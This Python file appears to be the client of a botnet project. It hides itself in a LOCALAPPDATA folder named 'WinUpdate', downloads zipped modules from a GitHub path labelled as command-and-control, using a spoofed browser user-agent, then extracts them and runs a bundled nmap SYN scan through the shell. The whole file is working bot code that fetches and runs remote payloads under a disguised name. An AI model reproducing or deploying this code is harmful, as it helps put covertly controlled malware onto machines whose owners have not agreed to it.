import os
from os import listdir
from os.path import isfile, join
import zipfile

import requests

DISK_PATH = "{}\\WinUpdate".format(os.getenv('LOCALAPPDATA'))
C2_MODULES_PATH = r'https://github.com/notclement/botnet-enumeration-network/raw/master/server_django/apps/api/modules/{}'
HEADERS = {
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36'}


def download_module(module_name):
    path_to_zip_file = "{}\\{}.zip".format(DISK_PATH, module_name)
    with open(path_to_zip_file, 'wb') as file:
        response = requests.get(C2_MODULES_PATH.format(module_name), HEADERS)
        file.write(response.content)
    with zipfile.ZipFile(path_to_zip_file, 'r') as zip_ref:
        zip_ref.extractall(DISK_PATH + '\\' + module_name)
    os.remove(path_to_zip_file)


def get_loaded_modules():
    root = DISK_PATH
    return [f for f in listdir(root) if isfile(join(root, f)) and f.endswith('.exe')]


def main():
    # nmap -sS 127.0.0.0/24 80-160
    output_module = os.popen('{}\\{}'.format(DISK_PATH, 'nmap -sS 127.0.0.0/28 80'.replace('nmap', 'nmap.exe')))
    print(output_module.read())


if __name__ == '__main__':
    main()
